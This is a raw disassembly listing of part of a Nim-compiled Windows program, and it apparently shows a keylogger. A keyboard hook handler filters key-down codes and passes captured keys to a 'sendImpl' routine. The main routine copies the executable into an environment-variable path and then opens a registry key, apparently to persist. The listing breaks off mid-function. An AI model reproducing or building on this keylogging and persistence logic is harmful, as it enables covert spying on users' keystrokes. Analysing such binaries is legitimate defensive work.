  405cb8:	41 54                	push   %r12
  405cba:	55                   	push   %rbp
  405cbb:	57                   	push   %rdi
  405cbc:	56                   	push   %rsi
  405cbd:	53                   	push   %rbx
  405cbe:	48 83 ec 48          	sub    $0x48,%rsp
  405cc2:	85 c9                	test   %ecx,%ecx
  405cc4:	89 cf                	mov    %ecx,%edi
  405cc6:	48 89 d5             	mov    %rdx,%rbp
  405cc9:	4d 89 c4             	mov    %r8,%r12
  405ccc:	0f 85 d0 01 00 00    	jne    405ea2 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x1ec>
  405cd2:	4d 63 28             	movslq (%r8),%r13
  405cd5:	4c 8d 0d 24 82 00 00 	lea    0x8224(%rip),%r9        # 40df00 <TM__6xDbQkzVUgF9a7K69bKsIjWQ_195>
  405cdc:	b9 a1 b0 b9 12       	mov    $0x12b9b0a1,%ecx
  405ce1:	4d 85 ed             	test   %r13,%r13
  405ce4:	4c 89 eb             	mov    %r13,%rbx
  405ce7:	49 0f 45 cd          	cmovne %r13,%rcx
  405ceb:	48 89 ca             	mov    %rcx,%rdx
  405cee:	81 e2 ff 01 00 00    	and    $0x1ff,%edx
  405cf4:	48 6b c2 18          	imul   $0x18,%rdx,%rax
  405cf8:	4c 01 c8             	add    %r9,%rax
  405cfb:	4c 8b 40 10          	mov    0x10(%rax),%r8
  405cff:	4d 85 c0             	test   %r8,%r8
  405d02:	0f 84 ee 00 00 00    	je     405df6 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x140>
  405d08:	49 39 c8             	cmp    %rcx,%r8
  405d0b:	75 06                	jne    405d13 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x5d>
  405d0d:	4c 3b 68 18          	cmp    0x18(%rax),%r13
  405d11:	74 0b                	je     405d1e <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x68>
  405d13:	48 ff c2             	inc    %rdx
  405d16:	81 e2 ff 01 00 00    	and    $0x1ff,%edx
  405d1c:	eb d6                	jmp    405cf4 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x3e>
  405d1e:	48 8b 48 20          	mov    0x20(%rax),%rcx
  405d22:	e8 9c e3 ff ff       	call   4040c3 <copyString>
  405d27:	48 89 ea             	mov    %rbp,%rdx
  405d2a:	48 83 e2 fb          	and    $0xfffffffffffffffb,%rdx
  405d2e:	48 81 fa 00 01 00 00 	cmp    $0x100,%rdx
  405d35:	74 0e                	je     405d45 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x8f>
  405d37:	48 81 fa 01 01 00 00 	cmp    $0x101,%rdx
  405d3e:	74 0f                	je     405d4f <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x99>
  405d40:	e9 5d 01 00 00       	jmp    405ea2 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x1ec>
  405d45:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  405d4a:	e9 8b 00 00 00       	jmp    405dda <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x124>
  405d4f:	83 fb 11             	cmp    $0x11,%ebx
  405d52:	74 3f                	je     405d93 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xdd>
  405d54:	81 fb a2 00 00 00    	cmp    $0xa2,%ebx
  405d5a:	74 37                	je     405d93 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xdd>
  405d5c:	89 da                	mov    %ebx,%edx
  405d5e:	83 e2 fd             	and    $0xfffffffd,%edx
  405d61:	83 fa 10             	cmp    $0x10,%edx
  405d64:	74 2d                	je     405d93 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xdd>
  405d66:	83 fb 14             	cmp    $0x14,%ebx
  405d69:	74 28                	je     405d93 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xdd>
  405d6b:	8d 93 70 ff ff ff    	lea    -0x90(%rbx),%edx
  405d71:	83 fa 15             	cmp    $0x15,%edx
  405d74:	76 0e                	jbe    405d84 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xce>
  405d76:	83 eb 5b             	sub    $0x5b,%ebx
  405d79:	83 fb 01             	cmp    $0x1,%ebx
  405d7c:	0f 87 20 01 00 00    	ja     405ea2 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x1ec>
  405d82:	eb 0f                	jmp    405d93 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xdd>
  405d84:	b9 01 00 3b 00       	mov    $0x3b0001,%ecx
  405d89:	48 0f a3 d1          	bt     %rdx,%rcx
  405d8d:	0f 83 0f 01 00 00    	jae    405ea2 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x1ec>
  405d93:	48 89 c1             	mov    %rax,%rcx
  405d96:	31 db                	xor    %ebx,%ebx
  405d98:	e8 26 e3 ff ff       	call   4040c3 <copyString>
  405d9d:	48 85 c0             	test   %rax,%rax
  405da0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  405da5:	74 03                	je     405daa <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0xf4>
  405da7:	48 8b 18             	mov    (%rax),%rbx
  405daa:	48 8d 53 01          	lea    0x1(%rbx),%rdx
  405dae:	48 89 c1             	mov    %rax,%rcx
  405db1:	e8 4e e3 ff ff       	call   404104 <setLengthStr>
  405db6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  405dbb:	48 89 c2             	mov    %rax,%rdx
  405dbe:	e8 ff d0 ff ff       	call   402ec2 <unsureAsgnRef>
  405dc3:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
  405dc8:	48 8d 43 ff          	lea    -0x1(%rbx),%rax
  405dcc:	48 85 c0             	test   %rax,%rax
  405dcf:	7f 18                	jg     405de9 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x133>
  405dd1:	c6 42 11 2f          	movb   $0x2f,0x11(%rdx)
  405dd5:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
  405dda:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
  405ddf:	e8 bf fc ff ff       	call   405aa3 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.20>
  405de4:	e9 b9 00 00 00       	jmp    405ea2 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x1ec>
  405de9:	8a 4c 02 10          	mov    0x10(%rdx,%rax,1),%cl
  405ded:	88 4c 02 11          	mov    %cl,0x11(%rdx,%rax,1)
  405df1:	48 ff c8             	dec    %rax
  405df4:	eb d6                	jmp    405dcc <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x116>
  405df6:	48 8d 0d 83 f3 01 00 	lea    0x1f383(%rip),%rcx        # 425180 <NTI__8SzoIAgLw9ci2v0yafHj9b6Q_>
  405dfd:	ba 30 00 00 00       	mov    $0x30,%edx
  405e02:	e8 df de ff ff       	call   403ce6 <newObj>
  405e07:	4c 89 e9             	mov    %r13,%rcx
  405e0a:	48 89 c6             	mov    %rax,%rsi
  405e0d:	48 8d 05 ac f3 01 00 	lea    0x1f3ac(%rip),%rax        # 4251c0 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_>
  405e14:	48 89 06             	mov    %rax,(%rsi)
  405e17:	48 8d 05 2b 64 00 00 	lea    0x642b(%rip),%rax        # 40c249 <.rdata+0x249>
  405e1e:	48 89 46 10          	mov    %rax,0x10(%rsi)
  405e22:	e8 88 e3 ff ff       	call   4041af <nimIntToStr>
  405e27:	b9 0f 00 00 00       	mov    $0xf,%ecx
  405e2c:	48 85 c0             	test   %rax,%rax
  405e2f:	49 89 c5             	mov    %rax,%r13
  405e32:	74 08                	je     405e3c <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x186>
  405e34:	49 8b 45 00          	mov    0x0(%r13),%rax
  405e38:	48 8d 48 0f          	lea    0xf(%rax),%rcx
  405e3c:	e8 0b df ff ff       	call   403d4c <rawNewString>
  405e41:	48 8d 15 78 b5 00 00 	lea    0xb578(%rip),%rdx        # 4113c0 <TM__4SoG2KRQy3oMm9aUzSLtGrA_2>
  405e48:	48 89 c1             	mov    %rax,%rcx
  405e4b:	49 89 c1             	mov    %rax,%r9
  405e4e:	e8 2a bb ff ff       	call   40197d <appendString.part.0>
  405e53:	4c 89 ea             	mov    %r13,%rdx
  405e56:	4c 89 c9             	mov    %r9,%rcx
  405e59:	e8 45 bb ff ff       	call   4019a3 <appendString.lto_priv.48>
  405e5e:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
  405e62:	4c 89 ca             	mov    %r9,%rdx
  405e65:	e8 96 d0 ff ff       	call   402f00 <asgnRef.lto_priv.64>
  405e6a:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
  405e6e:	31 d2                	xor    %edx,%edx
  405e70:	e8 8b d0 ff ff       	call   402f00 <asgnRef.lto_priv.64>
  405e75:	4c 8d 0d bf 63 00 00 	lea    0x63bf(%rip),%r9        # 40c23b <.rdata+0x23b>
  405e7c:	48 89 f1             	mov    %rsi,%rcx
  405e7f:	48 c7 44 24 20 06 01 	movq   $0x106,0x20(%rsp)
  405e86:	00 00 
  405e88:	4c 8d 05 b7 63 00 00 	lea    0x63b7(%rip),%r8        # 40c246 <.rdata+0x246>
  405e8f:	48 8d 15 b3 63 00 00 	lea    0x63b3(%rip),%rdx        # 40c249 <.rdata+0x249>
  405e96:	e8 1d f4 ff ff       	call   4052b8 <raiseExceptionEx>
  405e9b:	31 c0                	xor    %eax,%eax
  405e9d:	e9 85 fe ff ff       	jmp    405d27 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw+0x71>
  405ea2:	4d 89 e1             	mov    %r12,%r9
  405ea5:	49 89 e8             	mov    %rbp,%r8
  405ea8:	89 fa                	mov    %edi,%edx
  405eaa:	31 c9                	xor    %ecx,%ecx
  405eac:	ff 15 36 4e 02 00    	call   *0x24e36(%rip)        # 42ace8 <Dl_30890001_>
  405eb2:	48 83 c4 48          	add    $0x48,%rsp
  405eb6:	5b                   	pop    %rbx
  405eb7:	5e                   	pop    %rsi
  405eb8:	5f                   	pop    %rdi
  405eb9:	5d                   	pop    %rbp
  405eba:	41 5c                	pop    %r12
  405ebc:	41 5d                	pop    %r13
  405ebe:	c3                   	ret

0000000000405ebf <incrSeqV3>:
  405ebf:	57                   	push   %rdi
  405ec0:	56                   	push   %rsi
  405ec1:	53                   	push   %rbx
  405ec2:	48 83 ec 20          	sub    $0x20,%rsp
  405ec6:	48 85 c9             	test   %rcx,%rcx
  405ec9:	48 89 cb             	mov    %rcx,%rbx
  405ecc:	48 89 d6             	mov    %rdx,%rsi
  405ecf:	74 4a                	je     405f1b <incrSeqV3+0x5c>
  405ed1:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  405ed8:	ff ff 3f 
  405edb:	48 23 4b 08          	and    0x8(%rbx),%rcx
  405edf:	48 3b 0b             	cmp    (%rbx),%rcx
  405ee2:	7f 4e                	jg     405f32 <incrSeqV3+0x73>
  405ee4:	e8 f4 b6 ff ff       	call   4015dd <resize__cOCDWr16YD4j3dBrbbH3yQsystem>
  405ee9:	48 89 f1             	mov    %rsi,%rcx
  405eec:	48 89 c2             	mov    %rax,%rdx
  405eef:	e8 e3 f7 ff ff       	call   4056d7 <newSeq>
  405ef4:	48 8b 0b             	mov    (%rbx),%rcx
  405ef7:	4c 8b 46 10          	mov    0x10(%rsi),%r8
  405efb:	48 8d 50 10          	lea    0x10(%rax),%rdx
  405eff:	48 8d 73 10          	lea    0x10(%rbx),%rsi
  405f03:	48 89 d7             	mov    %rdx,%rdi
  405f06:	48 89 08             	mov    %rcx,(%rax)
  405f09:	49 0f af 08          	imul   (%r8),%rcx
  405f0d:	f3 a4                	rep movsb (%rsi),(%rdi)
  405f0f:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
  405f16:	48 89 c3             	mov    %rax,%rbx
  405f19:	eb 17                	jmp    405f32 <incrSeqV3+0x73>
  405f1b:	ba 01 00 00 00       	mov    $0x1,%edx
  405f20:	48 89 f1             	mov    %rsi,%rcx
  405f23:	e8 af f7 ff ff       	call   4056d7 <newSeq>
  405f28:	48 89 c3             	mov    %rax,%rbx
  405f2b:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  405f32:	48 89 d8             	mov    %rbx,%rax
  405f35:	48 83 c4 20          	add    $0x20,%rsp
  405f39:	5b                   	pop    %rbx
  405f3a:	5e                   	pop    %rsi
  405f3b:	5f                   	pop    %rdi
  405f3c:	c3                   	ret

0000000000405f3d <NimMainInner>:
  405f3d:	41 57                	push   %r15
  405f3f:	41 56                	push   %r14
  405f41:	41 55                	push   %r13
  405f43:	41 54                	push   %r12
  405f45:	55                   	push   %rbp
  405f46:	57                   	push   %rdi
  405f47:	56                   	push   %rsi
  405f48:	53                   	push   %rbx
  405f49:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
  405f50:	48 8d 0d f2 d3 ff ff 	lea    -0x2c0e(%rip),%rcx        # 403349 <TM__LJ9cWUOIKdJkv7vFbyFx9a6g_2>
  405f57:	be 04 01 00 00       	mov    $0x104,%esi
  405f5c:	48 8d 2d 9d 60 00 00 	lea    0x609d(%rip),%rbp        # 40c000 <.rdata>
  405f63:	e8 b6 be ff ff       	call   401e1e <nimRegisterGlobalMarker>
  405f68:	48 8d 0d cc d3 ff ff 	lea    -0x2c34(%rip),%rcx        # 40333b <TM__LJ9cWUOIKdJkv7vFbyFx9a6g_3>
  405f6f:	e8 aa be ff ff       	call   401e1e <nimRegisterGlobalMarker>
  405f74:	ff 15 ae 4d 02 00    	call   *0x24dae(%rip)        # 42ad28 <Dl_32995001_>
  405f7a:	ba 04 01 00 00       	mov    $0x104,%edx
  405f7f:	48 8d 0d 7a 60 00 00 	lea    0x607a(%rip),%rcx        # 40c000 <.rdata>
  405f86:	e8 f5 de ff ff       	call   403e80 <newWideCString__K8rR70TBwrP6FNBzDhVVOA>
  405f8b:	48 89 c7             	mov    %rax,%rdi
  405f8e:	31 c9                	xor    %ecx,%ecx
  405f90:	41 89 f0             	mov    %esi,%r8d
  405f93:	48 89 fa             	mov    %rdi,%rdx
  405f96:	ff 15 6c 3c 02 00    	call   *0x23c6c(%rip)        # 429c08 <Dl_14037022_>
  405f9c:	85 c0                	test   %eax,%eax
  405f9e:	89 c3                	mov    %eax,%ebx
  405fa0:	74 23                	je     405fc5 <NimMainInner+0x88>
  405fa2:	39 c6                	cmp    %eax,%esi
  405fa4:	48 63 d0             	movslq %eax,%rdx
  405fa7:	7c 0d                	jl     405fb6 <NimMainInner+0x79>
  405fa9:	48 89 f9             	mov    %rdi,%rcx
  405fac:	e8 a0 e3 ff ff       	call   404351 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43>
  405fb1:	48 89 c3             	mov    %rax,%rbx
  405fb4:	eb 11                	jmp    405fc7 <NimMainInner+0x8a>
  405fb6:	48 89 e9             	mov    %rbp,%rcx
  405fb9:	89 de                	mov    %ebx,%esi
  405fbb:	e8 c0 de ff ff       	call   403e80 <newWideCString__K8rR70TBwrP6FNBzDhVVOA>
  405fc0:	48 89 c7             	mov    %rax,%rdi
  405fc3:	eb c9                	jmp    405f8e <NimMainInner+0x51>
  405fc5:	31 db                	xor    %ebx,%ebx
  405fc7:	ff 15 8b 4d 02 00    	call   *0x24d8b(%rip)        # 42ad58 <Dl_61320001_>
  405fcd:	48 8d 15 ec b4 00 00 	lea    0xb4ec(%rip),%rdx        # 4114c0 <TM__ngdzsFozov7SgOThmPolog_3>
  405fd4:	48 8d 0d 05 b5 00 00 	lea    0xb505(%rip),%rcx        # 4114e0 <TM__ngdzsFozov7SgOThmPolog_2>
  405fdb:	ff c8                	dec    %eax
  405fdd:	0f 84 b1 01 00 00    	je     406194 <NimMainInner+0x257>
  405fe3:	e8 b8 bc ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  405fe8:	49 89 c5             	mov    %rax,%r13
  405feb:	e8 b0 bc ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  405ff0:	49 89 c6             	mov    %rax,%r14
  405ff3:	e8 a8 bc ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  405ff8:	80 b8 50 34 00 00 00 	cmpb   $0x0,0x3450(%rax)
  405fff:	48 89 c6             	mov    %rax,%rsi
  406002:	0f 85 c0 00 00 00    	jne    4060c8 <NimMainInner+0x18b>
  406008:	4c 8d a0 58 34 00 00 	lea    0x3458(%rax),%r12
  40600f:	31 d2                	xor    %edx,%edx
  406011:	4c 89 e1             	mov    %r12,%rcx
  406014:	e8 a9 ce ff ff       	call   402ec2 <unsureAsgnRef>
  406019:	ff 15 e1 3b 02 00    	call   *0x23be1(%rip)        # 429c00 <Dl_14037645_>
  40601f:	48 85 c0             	test   %rax,%rax
  406022:	48 89 c7             	mov    %rax,%rdi
  406025:	0f 84 9d 00 00 00    	je     4060c8 <NimMainInner+0x18b>
  40602b:	49 89 c7             	mov    %rax,%r15
  40602e:	31 d2                	xor    %edx,%edx
  406030:	4c 89 f9             	mov    %r15,%rcx
  406033:	e8 a8 23 00 00       	call   4083e0 <wcschr>
  406038:	4c 89 f9             	mov    %r15,%rcx
  40603b:	ba 50 00 00 00       	mov    $0x50,%edx
  406040:	48 89 c5             	mov    %rax,%rbp
  406043:	e8 09 e3 ff ff       	call   404351 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43>
  406048:	48 8b 8e 58 34 00 00 	mov    0x3458(%rsi),%rcx
  40604f:	48 8d 15 2a 3e 02 00 	lea    0x23e2a(%rip),%rdx        # 429e80 <NTI__sM4lkSb7zS6F7OVMvW9cffQ_>
  406056:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
  40605b:	e8 5f fe ff ff       	call   405ebf <incrSeqV3>
  406060:	4c 89 e1             	mov    %r12,%rcx
  406063:	48 89 c2             	mov    %rax,%rdx
  406066:	e8 57 ce ff ff       	call   402ec2 <unsureAsgnRef>
  40606b:	48 8b 86 58 34 00 00 	mov    0x3458(%rsi),%rax
  406072:	48 8b 10             	mov    (%rax),%rdx
  406075:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
  406079:	48 89 08             	mov    %rcx,(%rax)
  40607c:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
  406081:	4c 8d 04 d0          	lea    (%rax,%rdx,8),%r8
  406085:	4d 8b 78 10          	mov    0x10(%r8),%r15
  406089:	4c 89 44 24 58       	mov    %r8,0x58(%rsp)
  40608e:	e8 ad db ff ff       	call   403c40 <copyStringRC1>
  406093:	4c 8b 44 24 58       	mov    0x58(%rsp),%r8
  406098:	4d 85 ff             	test   %r15,%r15
  40609b:	49 89 40 10          	mov    %rax,0x10(%r8)
  40609f:	74 08                	je     4060a9 <NimMainInner+0x16c>
  4060a1:	4c 89 f9             	mov    %r15,%rcx
  4060a4:	e8 88 ce ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.79>
  4060a9:	66 83 7d 02 00       	cmpw   $0x0,0x2(%rbp)
  4060ae:	4c 8d 7d 02          	lea    0x2(%rbp),%r15
  4060b2:	0f 85 76 ff ff ff    	jne    40602e <NimMainInner+0xf1>
  4060b8:	48 89 f9             	mov    %rdi,%rcx
  4060bb:	ff 15 37 3b 02 00    	call   *0x23b37(%rip)        # 429bf8 <Dl_14037647_>
  4060c1:	c6 86 50 34 00 00 01 	movb   $0x1,0x3450(%rsi)
  4060c8:	b9 08 00 00 00       	mov    $0x8,%ecx
  4060cd:	e8 7a dc ff ff       	call   403d4c <rawNewString>
  4060d2:	48 8d 15 57 b4 00 00 	lea    0xb457(%rip),%rdx        # 411530 <TM__ngdzsFozov7SgOThmPolog_4>
  4060d9:	48 89 c1             	mov    %rax,%rcx
  4060dc:	49 89 c1             	mov    %rax,%r9
  4060df:	e8 99 b8 ff ff       	call   40197d <appendString.part.0>
  4060e4:	49 8b 11             	mov    (%r9),%rdx
  4060e7:	41 c6 44 11 10 3d    	movb   $0x3d,0x10(%r9,%rdx,1)
  4060ed:	48 ff c2             	inc    %rdx
  4060f0:	41 c6 44 11 10 00    	movb   $0x0,0x10(%r9,%rdx,1)
  4060f6:	4d 8b 9e 58 34 00 00 	mov    0x3458(%r14),%r11
  4060fd:	49 89 11             	mov    %rdx,(%r9)
  406100:	4d 85 db             	test   %r11,%r11
  406103:	74 64                	je     406169 <NimMainInner+0x22c>
  406105:	49 8b 03             	mov    (%r11),%rax
  406108:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  40610c:	31 c0                	xor    %eax,%eax
  40610e:	48 39 c6             	cmp    %rax,%rsi
  406111:	7c 56                	jl     406169 <NimMainInner+0x22c>
  406113:	49 8b 7c c3 10       	mov    0x10(%r11,%rax,8),%rdi
  406118:	31 c9                	xor    %ecx,%ecx
  40611a:	48 85 ff             	test   %rdi,%rdi
  40611d:	0f 84 11 0b 00 00    	je     406c34 <NimMainInner+0xcf7>
  406123:	48 3b 0f             	cmp    (%rdi),%rcx
  406126:	0f 8d 08 0b 00 00    	jge    406c34 <NimMainInner+0xcf7>
  40612c:	48 39 ca             	cmp    %rcx,%rdx
  40612f:	0f 8e ff 0a 00 00    	jle    406c34 <NimMainInner+0xcf7>
  406135:	44 8a 44 0f 10       	mov    0x10(%rdi,%rcx,1),%r8b
  40613a:	45 8d 50 bf          	lea    -0x41(%r8),%r10d
  40613e:	41 80 fa 19          	cmp    $0x19,%r10b
  406142:	77 04                	ja     406148 <NimMainInner+0x20b>
  406144:	41 83 c0 20          	add    $0x20,%r8d
  406148:	45 8a 54 09 10       	mov    0x10(%r9,%rcx,1),%r10b
  40614d:	41 8d 6a bf          	lea    -0x41(%r10),%ebp
  406151:	40 80 fd 19          	cmp    $0x19,%bpl
  406155:	77 04                	ja     40615b <NimMainInner+0x21e>
  406157:	41 83 c2 20          	add    $0x20,%r10d
  40615b:	45 38 c2             	cmp    %r8b,%r10b
  40615e:	0f 85 d0 0a 00 00    	jne    406c34 <NimMainInner+0xcf7>
  406164:	48 ff c1             	inc    %rcx
  406167:	eb b1                	jmp    40611a <NimMainInner+0x1dd>
  406169:	48 8d 0d c0 b3 00 00 	lea    0xb3c0(%rip),%rcx        # 411530 <TM__ngdzsFozov7SgOThmPolog_4>
  406170:	e8 dc b3 ff ff       	call   401551 <nimToCStringConv.lto_priv.52>
  406175:	48 89 c1             	mov    %rax,%rcx
  406178:	e8 9b 22 00 00       	call   408418 <getenv>
  40617d:	48 85 c0             	test   %rax,%rax
  406180:	74 08                	je     40618a <NimMainInner+0x24d>
  406182:	48 89 c1             	mov    %rax,%rcx
  406185:	e8 86 ec ff ff       	call   404e10 <cstrToNimstr>
  40618a:	48 8d 15 7f b3 00 00 	lea    0xb37f(%rip),%rdx        # 411510 <TM__ngdzsFozov7SgOThmPolog_5>
  406191:	48 89 c1             	mov    %rax,%rcx
  406194:	e8 ad e7 ff ff       	call   404946 <nosjoinPath>
  406199:	48 85 db             	test   %rbx,%rbx
  40619c:	48 89 c6             	mov    %rax,%rsi
  40619f:	0f 84 05 0b 00 00    	je     406caa <NimMainInner+0xd6d>
  4061a5:	31 c0                	xor    %eax,%eax
  4061a7:	48 85 f6             	test   %rsi,%rsi
  4061aa:	4c 8b 03             	mov    (%rbx),%r8
  4061ad:	74 03                	je     4061b2 <NimMainInner+0x275>
  4061af:	48 8b 06             	mov    (%rsi),%rax
  4061b2:	49 39 c0             	cmp    %rax,%r8
  4061b5:	75 1e                	jne    4061d5 <NimMainInner+0x298>
  4061b7:	4d 85 c0             	test   %r8,%r8
  4061ba:	0f 84 0a 01 00 00    	je     4062ca <NimMainInner+0x38d>
  4061c0:	48 8d 56 10          	lea    0x10(%rsi),%rdx
  4061c4:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  4061c8:	e8 6b 24 00 00       	call   408638 <memcmp>
  4061cd:	85 c0                	test   %eax,%eax
  4061cf:	0f 84 f5 00 00 00    	je     4062ca <NimMainInner+0x38d>
  4061d5:	48 89 d9             	mov    %rbx,%rcx
  4061d8:	e8 57 de ff ff       	call   404034 <newWideCString__rFkWhJjmVi0m0Hc9agVEZIQ>
  4061dd:	48 89 f1             	mov    %rsi,%rcx
  4061e0:	48 89 c7             	mov    %rax,%rdi
  4061e3:	e8 4c de ff ff       	call   404034 <newWideCString__rFkWhJjmVi0m0Hc9agVEZIQ>
  4061e8:	45 31 c0             	xor    %r8d,%r8d
  4061eb:	48 89 f9             	mov    %rdi,%rcx
  4061ee:	48 89 c2             	mov    %rax,%rdx
  4061f1:	ff 15 f9 39 02 00    	call   *0x239f9(%rip)        # 429bf0 <Dl_14037631_>
  4061f7:	85 c0                	test   %eax,%eax
  4061f9:	0f 85 cb 00 00 00    	jne    4062ca <NimMainInner+0x38d>
  4061ff:	e8 d2 b3 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  406204:	ba 10 00 00 00       	mov    $0x10,%edx
  406209:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
  406210:	00 
  406211:	89 c5                	mov    %eax,%ebp
  406213:	e8 aa b7 ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  406218:	48 89 d9             	mov    %rbx,%rcx
  40621b:	e8 a3 de ff ff       	call   4040c3 <copyString>
  406220:	48 8d 5c 24 70       	lea    0x70(%rsp),%rbx
  406225:	48 89 f1             	mov    %rsi,%rcx
  406228:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
  40622f:	00 
  406230:	e8 8e de ff ff       	call   4040c3 <copyString>
  406235:	4c 8b a4 24 a0 00 00 	mov    0xa0(%rsp),%r12
  40623c:	00 
  40623d:	48 8d 0d dc b1 00 00 	lea    0xb1dc(%rip),%rcx        # 411420 <TM__n49a9aYp5BrbXv9a6OCpJYm0g_2>
  406244:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
  40624b:	00 00 
  40624d:	48 89 c7             	mov    %rax,%rdi
  406250:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
  406257:	00 
  406258:	e8 66 de ff ff       	call   4040c3 <copyString>
  40625d:	48 89 d9             	mov    %rbx,%rcx
  406260:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
  406265:	4c 89 e2             	mov    %r12,%rdx
  406268:	e8 49 e7 ff ff       	call   4049b6 <addQuoted__45fPtFhY4FavRaYwDhRfuA>
  40626d:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
  406272:	ba 02 00 00 00       	mov    $0x2,%edx
  406277:	e8 2b e3 ff ff       	call   4045a7 <resizeString>
  40627c:	48 8d 15 7d b1 00 00 	lea    0xb17d(%rip),%rdx        # 411400 <TM__n49a9aYp5BrbXv9a6OCpJYm0g_3>
  406283:	48 89 c1             	mov    %rax,%rcx
  406286:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
  40628b:	e8 ed b6 ff ff       	call   40197d <appendString.part.0>
  406290:	48 89 fa             	mov    %rdi,%rdx
  406293:	48 89 d9             	mov    %rbx,%rcx
  406296:	e8 1b e7 ff ff       	call   4049b6 <addQuoted__45fPtFhY4FavRaYwDhRfuA>
  40629b:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
  4062a0:	ba 01 00 00 00       	mov    $0x1,%edx
  4062a5:	e8 fd e2 ff ff       	call   4045a7 <resizeString>
  4062aa:	48 8d 15 2f b1 00 00 	lea    0xb12f(%rip),%rdx        # 4113e0 <TM__n49a9aYp5BrbXv9a6OCpJYm0g_5>
  4062b1:	48 89 c1             	mov    %rax,%rcx
  4062b4:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
  4062b9:	e8 bf b6 ff ff       	call   40197d <appendString.part.0>
  4062be:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
  4062c3:	89 e9                	mov    %ebp,%ecx
  4062c5:	e8 06 f1 ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  4062ca:	ff 15 88 4a 02 00    	call   *0x24a88(%rip)        # 42ad58 <Dl_61320001_>
  4062d0:	48 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%rbx
  4062d7:	00 
  4062d8:	ff c8                	dec    %eax
  4062da:	0f 85 9a 00 00 00    	jne    40637a <NimMainInner+0x43d>
  4062e0:	48 8d 0d 99 b1 00 00 	lea    0xb199(%rip),%rcx        # 411480 <TM__ngdzsFozov7SgOThmPolog_6>
  4062e7:	48 c7 84 24 a0 00 00 	movq   $0x0,0xa0(%rsp)
  4062ee:	00 00 00 00 00 
  4062f3:	e8 87 da ff ff       	call   403d7f <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.69>
  4062f8:	48 89 c1             	mov    %rax,%rcx
  4062fb:	e8 68 b2 ff ff       	call   401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.71>
  406300:	41 b9 02 00 00 00    	mov    $0x2,%r9d
  406306:	45 31 c0             	xor    %r8d,%r8d
  406309:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
  406310:	48 89 c2             	mov    %rax,%rdx
  406313:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
  406318:	ff 15 2a 4a 02 00    	call   *0x24a2a(%rip)        # 42ad48 <Dl_33470001_>
  40631e:	48 8d 0d 1b b1 00 00 	lea    0xb11b(%rip),%rcx        # 411440 <TM__ngdzsFozov7SgOThmPolog_7>
  406325:	e8 55 da ff ff       	call   403d7f <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.69>
  40632a:	48 89 c1             	mov    %rax,%rcx
  40632d:	e8 36 b2 ff ff       	call   401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.71>
